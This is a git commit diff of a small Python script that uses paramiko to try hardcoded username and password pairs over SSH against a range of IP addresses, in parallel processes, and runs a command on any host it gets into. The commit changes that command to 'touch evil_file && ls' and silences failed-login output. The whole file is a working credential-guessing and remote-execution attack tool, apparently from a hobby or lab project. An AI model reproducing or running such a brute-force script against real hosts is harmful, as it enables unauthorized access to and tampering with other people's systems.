158585b91b92e37205261346870a8c3ae9ed1640
root <fr3shnuts@gmail.com>
2019-06-13 23:51:10 -0700

    p.join(), multiprocessing.

--- new_scan_drop.py
+++ new_scan_drop.py
@@ -1,6 +1,10 @@
 import paramiko
 import multiprocessing
 import time
+import warnings
+
+# remove depracated warnings
+warnings.filterwarnings(action='ignore',module='.*paramiko.*')
 
 user_list = ['fresh1','fresh2','fresh3','fresh4']
 pass_list = ['fresh4','fresh3','fresh2','fresh1']
@@ -15,13 +19,13 @@ def ssh_start():
     p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         p.connect(ip, username=user_list[num], password=pass_list[num2])
-        stdin, stdout, stderr = p.exec_command('ls')
+        stdin, stdout, stderr = p.exec_command('touch evil_file && ls')
         for line in stdout:
             print(line.strip('\n'))
         for line in stderr:
             print(line.strip('\n'))
     except paramiko.AuthenticationException:
-        print "Connection failed: " + ip  
+            pass
 
 for i in range(150,155):
     for num in range(0,4):
@@ -29,6 +33,7 @@ for i in range(150,155):
             p = multiprocessing.Process(target=ssh_start)
             jobs.append(p)
             p.start()
+            p.join()
             num2 += 1
     num += 1
 
